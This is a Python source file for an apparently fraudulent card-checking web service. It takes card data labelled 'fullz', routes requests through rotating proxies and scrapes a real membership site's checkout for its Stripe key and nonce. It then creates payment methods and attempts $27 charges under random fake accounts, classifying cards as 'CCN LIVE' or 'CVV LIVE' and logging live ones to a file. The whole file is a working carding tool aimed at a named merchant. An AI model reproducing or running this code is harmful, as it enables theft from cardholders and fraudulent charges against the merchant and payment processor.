import requests
import asyncio
import random
import time
import json
import pathlib
from aiohttp import web
import httpx
from html import unescape
from bs4 import BeautifulSoup


def load_proxies_from_file(filename="proxy.txt"):
    proxies = []
    try:
        with open(filename, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                parts = line.split(":")
                if len(parts) == 4:
                    ip, port, user, password = parts
                    proxy_url = f"http://{user}:{password}@{ip}:{port}"
                    #print(f"Loaded proxy: {proxy_url}")  # Debug print
                    proxies.append(proxy_url)
                else:
                    print(f"Proxy format error (harus ip:port:user:pass): {line}")
    except FileNotFoundError:
        print(f"File {filename} tidak ditemukan.")
    return proxies


def gets(s, start, end):
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except ValueError:
        return None


def extract_relevant_error_message(result: str) -> str:
    lower_result = result.lower()

    keywords = [
        'security code is incorrect.',
        'security code is invalid.',
        'customer authentication is required',
        'try again in a few minutes',
    ]

    for key in keywords:
        if key in lower_result:
            return lower_result[lower_result.index(key):]

    return result


def map_error_message(result: str) -> str:
    lower_result = result.lower()

    processed_result = extract_relevant_error_message(result)

    if processed_result != result:
        lower_result = processed_result.lower()

        if 'security code is incorrect.' in lower_result:
            return "CCN LIVE ❎"
        if 'security code is invalid.' in lower_result:
            return "CCN LIVE ❎"
        if 'try again in a few minutes' in lower_result:
            return "TRY AGAIN LATER ❌"
        if 'customer authentication is required' in lower_result:
            return "3D Challenge Required ❎"

    # Handle direct custom error strings like CVV LIVE, CCN LIVE
    if 'cvv live ❎' in lower_result:
        return "CVV LIVE ❎"
    if 'ccn live ❎' in lower_result:
        return "CCN LIVE ❎"

    live_errors = [
        'insufficient funds',
        'your card has insufficient funds.',
        'your card does not support this type of purchase.',
        'transaction not allowed',
        'three_d_secure_redirect',
        'card_error_authentication_required',
        '3d challenge required',
        'invalid cvc',
    ]

    if 'that username is already taken' in lower_result:
        return 'Username Already Taken ❌'

    for err in live_errors:
        if err in lower_result:
            if 'invalid cvc' in lower_result:
                return "CCN LIVE ❎"
            if 'security code is incorrect.' in lower_result:
                return "CCN LIVE ❎"
            if 'security code is invalid.' in lower_result:
                return "CCN LIVE ❎"
            if 'try again in a few minutes' in lower_result:
                return "TRY AGAIN LATER ❌"
            if 'customer authentication is required to complete this transaction.' in lower_result:
                return "3D Challenge Required ❎"
            if 'insufficient funds' in lower_result or 'your card has insufficient funds.' in lower_result:
                return "Insufficient Funds ❎"
            if 'your card does not support this type of purchase.' in lower_result:
                return "Your card does not support this type of purchase ❎"
            return result + " ❎"

    error_mappings = {
        'incorrect_cvc': 'CCN LIVE ❎',
        'generic_decline': 'Generic Declined ❌',
        'do not honor': 'Do Not Honor ❌',
        'fraudulent': 'Fraudulent ❌',
        'setup_intent_authentication_failure': 'Setup Intent Authentication Failure ❌',
        'stolen card': 'Stolen Card ❌',
        'lost_card': 'Lost Card ❌',
        'pickup_card': 'Pickup Card ❌',
        'your card number is incorrect.': 'Incorrect Card Number ❌',
        'incorrect_number': 'Incorrect Card Number ❌',
        'expired_card': 'Expired Card ❌',
        'captcha required': 'Captcha Required ❌',
        'invalid expiry year': 'Expiration Year Invalid ❌',
        'invalid expiry month': 'Expiration Month Invalid ❌',
        'invalid account': 'Invalid card ❌',
        'invalid api key provided': 'Stripe api key invalid ❌',
        'testmode_charges_only': 'Stripe testmode charges only ❌',
        'api_key_expired': 'Stripe api key expired ❌',
        'your account cannot currently make live charges.': 'Stripe account cannot currently make live charges ❌',
        'your card was declined.': 'Your card was declined ❌',
    }

    for key, val in error_mappings.items():
        if key in lower_result:
            return val

    return result


async def create_payment_method(fullz, session, proxy_str):
    proxies = {
        'http': proxy_str,
        'https': proxy_str,
    }
    try:
        cc, mes, ano, cvv = fullz.split("|")

        # FORMAT dan VALIDASI MASA BERLAKU KARTU
        mes = mes.zfill(2)
        if len(ano) == 4:
            ano = ano[-2:]

        current_year = int(time.strftime("%y"))
        current_month = int(time.strftime("%m"))

        try:
            expiry_month = int(mes)
            expiry_year = int(ano)
        except ValueError:
            return {"html": "", "paid": False, "error": "Invalid expiry date"}

        if expiry_month < 1 or expiry_month > 12:
            return {"html": "", "paid": False, "error": "Expiration Month Invalid ❌"}
        if expiry_year < current_year:
            return {"html": "", "paid": False, "error": "Expiration Year Invalid ❌"}
        if expiry_year == current_year and expiry_month < current_month:
            return {"html": "", "paid": False, "error": "Expiration Month Invalid ❌"}

        # ==== Kode utama ====
        user = "paraelsan" + str(random.randint(9999, 574545))
        mail = "paraelsan" + str(random.randint(9999, 574545)) + "@gmail.com"
        pwd = "Paraelsan" + str(random.randint(9999, 574545)) + "@"

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
        }

        params = {
            'level': '2',
        }

        response = requests.get(
            'https://avweather.net/membership-account/membership-checkout/',
            params=params,
            headers=headers,
            proxies=proxies,
        )

        pk = gets(response.text, '"publishableKey":"', '",')
        nonce = gets(response.text, '<input type="hidden" id="pmpro_checkout_nonce" name="pmpro_checkout_nonce" value="', '" />')
        if not pk:
            return {"html": response.text, "paid": False, "error": "Failed to get pk"}
        if not nonce:
            return {"html": response.text, "paid": False, "error": "Failed to get nonce"}

        headers = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'priority': 'u=1, i',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
        }

        data = {
            'type':'card',
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_month]': mes,
            'card[exp_year]': ano,
            'guid':'fd158f34-badc-4a8f-beb7-1204440b230e769294',
            'muid':'d7acb112-7648-416d-8da3-8d20b8cf24214ccd8c',
            'sid':'847b8835-d8e6-422e-9e8f-585c1abe44a74d58f1',
            'payment_user_agent':'stripe.js/4e21d61aa2; stripe-js-v3/4e21d61aa2; split-card-element',
            'referrer':'https://avweather.net',
            'time_on_page':'337177',
            'client_attribution_metadata[client_session_id]':'424414a4-37be-45b8-bb41-2d8fe35ad078',
            'client_attribution_metadata[merchant_integration_source]':'elements',
            'client_attribution_metadata[merchant_integration_subtype]':'card-element',
            'client_attribution_metadata[merchant_integration_version]':'2017',
            'key': pk,
        }

        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, proxies=proxies,)

        pm_json = response.json()
        id = pm_json.get('id')
        if not id:
            return {"html": response.text, "paid": False, "error": "Failed to create payment method"}

        # Deteksi CVV LIVE / CCN LIVE berdasarkan cvc_check
        cvc_check = pm_json.get('card', {}).get('checks', {}).get('cvc_check', '')
        if not cvc_check:
            # fallback cek di card langsung
            cvc_check = pm_json.get('card', {}).get('cvc_check', '')

        cvc_check = cvc_check.lower()

        if cvc_check == 'pass':
            return {"html": response.text, "paid": False, "error": "CVV LIVE ❎"}
        elif cvc_check == 'fail':
            return {"html": response.text, "paid": False, "error": "CCN LIVE ❎"}

        brand = pm_json.get('card', {}).get('brand', '')
        last4 = pm_json.get('card', {}).get('last4', '')

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://avweather.net',
            'Referer': 'https://avweather.net/membership-account/membership-checkout/?level=2',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
        }

        params = {
            'level': '2',
        }

        data = {
            'pmpro_level': '2',
            'checkjavascript': '1',
            'pmpro_other_discount_code': '',
            'username': user,
            'password': pwd,
            'password2': pwd,
            'bemail': mail,
            'bconfirmemail': mail,
            'fullname': '',
            'CardType': brand,
            'pmpro_discount_code': '',
            'tos': '1',
            'pmpro_checkout_nonce': nonce,
            '_wp_http_referer': '/membership-account/membership-checkout/?level=2',
            'submit-checkout': '1',
            'javascriptok': '1',
            'payment_method_id': id,
            'AccountNumber': f'XXXXXXXXXXXX{last4}',
            'ExpirationMonth': mes,
            'ExpirationYear': ano,
        }

        response = requests.post(
            'https://avweather.net/membership-account/membership-checkout/',
            params=params,
            headers=headers,
            data=data,
            proxies=proxies,
        )

        html_text = response.text
        soup = BeautifulSoup(html_text, 'html.parser')
        paid_tag = soup.find("span", class_="pmpro_list_item_value pmpro_tag pmpro_tag-success")

        status_paid = False
        if paid_tag and paid_tag.text.strip().lower() == "paid":
            status_paid = True

        return {"html": html_text, "paid": status_paid}

    except Exception as e:
        return {"html": "", "paid": False, "error": str(e)}


async def charge_resp(result):
    try:
        if isinstance(result, dict):
            if result.get("paid"):
                return "Charged 27$ 🔥"
            else:
                if result.get("error"):
                    return map_error_message(result.get("error"))
                return "FAILED TO CREATE PAYMENT METHOD, TRY AGAIN ❌"

        result_str = result if isinstance(result, str) else str(result)

        mapped = map_error_message(result_str)
        if mapped != result_str:
            return mapped

        if '{"status":"SUCCEEDED",' in result_str or '"status":"succeeded"' in result_str:
            return "Charged 27$ 🔥"

        return result_str + "❌"

    except Exception as e:
        return f"{str(e)} ❌"


async def multi_checking(fullz, proxies):
    start = time.time()
    if not proxies:
        return "No proxies loaded."

    proxy = random.choice(proxies)
    #print(f"Using proxy: {proxy}")  # Debug output

    async with httpx.AsyncClient(timeout=40, proxy=proxy) as session:
        result = await create_payment_method(fullz, session, proxy)
        response = await charge_resp(result)

    elapsed = round(time.time() - start, 2)

    error_message = ""
    try:
        html_content = result["html"] if isinstance(result, dict) else result
        json_resp = json.loads(html_content)
        if "error" in json_resp:
            error_message = unescape(json_resp["error"].get("message", "")).strip()
    except Exception:
        try:
            soup = BeautifulSoup(result["html"] if isinstance(result, dict) else result, 'html.parser')
            error_div = soup.find('div', {'id': 'pmpro_message_bottom'})
            if error_div:
                error_message = error_div.get_text(strip=True)
        except Exception:
            pass

    if error_message:
        mapped_error = map_error_message(error_message)
        if "❎" not in mapped_error and "🔥" not in mapped_error and "❌" not in mapped_error:
            mapped_error += "❌"
        return f"{fullz} {mapped_error}"
    #f"{fullz} {mapped_error} {elapsed}s"
    #f"{fullz} {response} {elapsed}s"

    resp = f"{fullz} {response}"

    if any(keyword in response for keyword in ["Charged 27$ 🔥", "CCN LIVE ❎", "CVV LIVE ❎", "Insufficient Funds ❎", "Your card does not support this type of purchase ❎", "Transaction not allowed ❎", "3D Challenge Required ❎", "CCN LIVE ❎"]):
        with open("charge.txt", "a", encoding="utf-8") as file:
            file.write(resp + "\n")

    return resp


async def check_card(request):
    try:
        data = await request.json()
    except Exception:
        return web.json_response({"error": "Invalid JSON body"}, status=400)

    cc = data.get("cc")
    if not cc:
        return web.json_response({"error": "Missing 'cc' field"}, status=400)

    proxies = request.app.get("proxies", [])

    try:
        result = await multi_checking(cc, proxies)
        return web.json_response({"result": result})
    except Exception as e:
        return web.json_response({"error": str(e)}, status=500)


async def index(request):
    path = pathlib.Path(__file__).parent / "index.html"
    return web.FileResponse(path)


async def init_app():
    app = web.Application()
    app["proxies"] = load_proxies_from_file("proxy.txt")
    app.router.add_get("/", index)
    app.router.add_post("/check-card", check_card)
    return app


if __name__ == "__main__":
    app = asyncio.run(init_app())
    web.run_app(app, host="0.0.0.0", port=8080)
